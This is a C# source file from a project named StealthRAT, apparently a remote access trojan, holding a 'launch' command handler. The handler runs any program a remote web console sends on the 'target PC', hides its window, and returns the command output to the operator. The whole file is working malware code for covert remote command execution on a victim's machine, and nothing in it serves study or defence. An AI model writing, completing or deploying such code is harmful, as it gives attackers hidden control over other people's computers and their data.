using StealthRAT.Interfaces;
using StealthRAT.Services;

namespace StealthRAT.Handlers
{
    /// <summary>
    /// Handles the "launch" command. Runs processes on the target PC, 
    /// redirecting terminal output back to the web console.
    /// </summary>
    public sealed class LaunchProcessHandler : ICommandHandler
    {
        public string CommandName => "launch";

        public async Task ExecuteAsync(JsonElement payload, CommandContext context)
        {
            if (!payload.TryGetProperty("command", out var cmdProp) || string.IsNullOrWhiteSpace(cmdProp.GetString()))
            {
                await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                {
                    type = "cmd_response",
                    success = false,
                    output = "ERR: Missing program/command string."
                }));
                return;
            }

            string commandLine = cmdProp.GetString()!;
            AuditLoggerService.LogAction("launch", commandLine);
            string response = RunCommand(commandLine);

            await context.SendTextResponseAsync(JsonSerializer.Serialize(new
            {
                type = "cmd_response",
                success = !response.StartsWith("ERR:"),
                output = response
            }));
        }

        private string RunCommand(string cmd)
        {
            try
            {
                var parts = cmd.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length == 0) return "ERR: Empty command";

                string program = parts[0];
                string args = parts.Length > 1 ? string.Join(" ", parts.Skip(1)) : "";

                var psi = new ProcessStartInfo(program, args)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc == null) return "ERR: Failed to start process";

                    // Wait up to 1.5 seconds to capture output for quick commands (ipconfig, whoami, etc.)
                    if (proc.WaitForExit(1500))
                    {
                        string output = proc.StandardOutput.ReadToEnd();
                        string err = proc.StandardError.ReadToEnd();
                        return string.IsNullOrEmpty(err) ? output : $"Output:\n{output}\nError:\n{err}";
                    }
                    else
                    {
                        return $"OK: Launched in background (PID: {proc.Id})";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"ERR: {ex.Message}";
            }
        }
    }
}
